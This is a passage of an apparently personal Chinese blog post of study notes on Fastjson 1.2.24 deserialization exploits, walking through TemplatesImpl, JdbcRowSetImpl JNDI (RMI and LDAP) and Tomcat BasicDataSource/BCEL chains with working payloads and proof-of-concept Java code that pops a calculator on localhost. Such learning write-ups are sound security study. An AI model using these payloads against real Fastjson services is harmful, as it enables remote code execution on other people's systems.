class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilPath</span> <span class="operator">=</span> <span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>; <span class="comment">// 读字节码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilPath);</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil_Class</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + evil_Class + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;: [\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;flow&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>;</span><br><span class="line">      System.out.println(jsonText);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonText,Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到这里有个config，看了一下</p>
<p><strong><code>ParserConfig</code> 的作用</strong></p>
<p><code>ParserConfig</code> <strong>控制反序列化时的关键行为</strong>，包含：</p>
<ul>
<li><strong>自动类型检测（<code>autoTypeSupport</code>）</strong>：决定是否允许反序列化未明确声明的类。</li>
<li><strong>白名单&#x2F;黑名单</strong>：限制可反序列化的类。</li>
<li><strong>自定义反序列化解析器</strong>：处理特定类的实例化方式。</li>
</ul>
<p>若未显式传递<code>ParserConfig</code>，Fastjson默认使用全局配置（<code>ParserConfig.getGlobalInstance()</code>）。如果全局配置的<code>autoTypeSupport</code>为<code>false</code>（默认安全配置），则<code>TemplatesImpl</code>若不在白名单会导致反序列化失败。<br>传递自定义的<code>ParserConfig</code>则<strong>覆盖全局配置</strong>，使用新实例的独立配置。</p>
<p>这个总体不难理解，就先这样</p>
<h3 id="基于-JdbcRowSetImpl-的利用链"><a href="#基于-JdbcRowSetImpl-的利用链" class="headerlink" title="基于 JdbcRowSetImpl 的利用链"></a>基于 JdbcRowSetImpl 的利用链</h3><p>这个JdbcRowSetImpl类的利用主要就是基于 Bean Property 类型的 JNDI 的利用方式。里面可以找到lookup方法，这个对应上了之前的jndi注入后面的部分</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420143030.png" ></p>
<p><code>connect()</code>方法找出谁调用了，符合条件的就是<code>setAutoCommit()</code>，所以我们要到时exp要设置autoCommit参数，也要设置datasource才能保证被正确地lookup到，这就是这个链的利用思路</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420143142.png" ></p>
<h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NamingException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/calc\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<h4 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h4><p>原理和之前差不多</p>
<p>这里我用工具起一个ldap服务器，再改一下客户端代码就好了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1/HuoyZUQEBX/CommonsCollections6/Exec/eyJjbWQiOiJvcGVuIC1hIGNhbGN1bGF0b3IifQ==\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="LDAP高版本绕过"><a href="#LDAP高版本绕过" class="headerlink" title="LDAP高版本绕过"></a>LDAP高版本绕过</h4><p>如果要高版本绕过，依旧是选择本地恶意类加载就好，用到beanfactory即刻，这里就不掩饰了</p>
<h3 id="基于BasicDataSouce的利用链"><a href="#基于BasicDataSouce的利用链" class="headerlink" title="基于BasicDataSouce的利用链"></a>基于BasicDataSouce的利用链</h3><p>这个和tomcat相关，好处是可以不出网，用到本地的恶意类加载</p>
<p>tomcat有一个<code>org.apache.bcel.util.ClassLoader</code>类，里面有defineClass实现类加载</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420154253.png" ></p>
<p>要瞒住这段代码然后创建一个类名再到后面defineClass</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">	clazz = <span class="built_in">this</span>.createClass(class_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在先想办法调用<code>loadClass()</code>，现在尝试直接调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.bcel.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> org.apache.bcel.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>); <span class="comment">// 满足代码里面的判断条件</span></span><br><span class="line">        classLoader.loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是运行成功会弹计算器的</p>
<p>所以找到类<code>BasicDataSource#createConnectionFactory()</code>方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420155112.png" ></p>
<p>如果<code>driverClassLoader</code>不为空就会forName加载driverClassName和driverClassLoader，forName底层也会调用loadClass，所以现在看这两个参数是不是可控的，如果可以就把<strong>driverClassLoader</strong>指定成<code>org.apache.bcel.util.ClassLoader</code>，把<strong>driverClassName</strong>加载成恶意的字节码，从而实现恶意代码</p>
<p>当然是可控的，都有对应的setter</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420155722.png" ></p>
<p>那现在就看有哪里调用<code>createConnectionFactory()</code>方法，链子是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BasicDataSource.getConnection()</span><br><span class="line">	-&gt; createDataSource().getConnection()</span><br><span class="line">		-&gt;this.createConnectionFactory()</span><br></pre></td></tr></table></figure>

<p>先尝试直接调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        classLoader.loadClass(&quot;$$BCEL$$&quot;+code).newInstance();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassName(<span class="string">&quot;$$BCEL$$&quot;</span>+code);</span><br><span class="line">        basicDataSource.setDriverClassLoader(classLoader);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在也是可以弹计算器</p>
<p>下面引入fastjson反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        classLoader.loadClass(&quot;$$BCEL$$&quot;+code).newInstance();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(&quot;$$BCEL$$&quot;+code);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 修正的JSON字符串格式</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+ code + <span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.apache.bcel.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里要用parseObject才可以，因为要用到getter方法，parseObject里面parse后有toJson才会调用到getter方法</p>
<p>这个链子大概就是这样。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>【fastjson反序列化漏洞2-1.2.24利用】<a class="link"   href="https://www.bilibili.com/video/BV1pP411N726?vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1pP411N726?vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" >https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>前面讲到的利用还是套上了以前的知识，这次是用json字符串去触发反序列化，所以要先理解好前面的内容，相对来说结合jndi注入的利益链比较常见</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习</tag>
      </tags>
  </entry>
</search>
